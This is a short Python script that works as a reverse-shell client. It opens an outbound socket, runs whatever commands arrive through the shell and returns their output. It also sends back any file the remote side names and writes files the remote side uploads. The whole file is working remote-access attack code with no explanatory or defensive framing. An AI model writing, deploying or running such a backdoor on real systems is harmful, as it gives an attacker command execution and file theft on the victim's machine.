import socket
import subprocess
import os
p=int(input("Enter port: "))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", p))


def Send(so, files):
    try:
        with open(files, "rb") as f:
            while True:
                c = f.read(4096)
                if not c:
                    break
                so.sendall(c)
            so.sendall(b"<END_OF_FILE>")
    except Exception as e:
        so.sendall(str(e).encode())

def Receive(so, filename):
    try:
        with open(filename, "wb") as f:
            while True:
                chunk = so.recv(4096)
                if b"<END_OF_FILE>" in chunk:
                    f.write(chunk[:chunk.index(b"<END_OF_FILE>")])
                    break
                f.write(chunk)
        print(f"[+] Received and saved {filename}")
    except Exception as e:
        print(f"[-] Error receiving file: {e}")

while True:
    data = s.recv(1024).decode()
    if not data:
        break
    if data.startswith("upload "):
        filename = data.split(" ")[1]
        Receive(s, filename)
    elif os.path.isfile(data):
        Send(s, data)
    else:
        try:
            outputs = subprocess.Popen(
                data,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            result = outputs.stdout.read() + outputs.stderr.read()
            s.sendall(result)
        except Exception as e:
            s.sendall(str(e).encode())







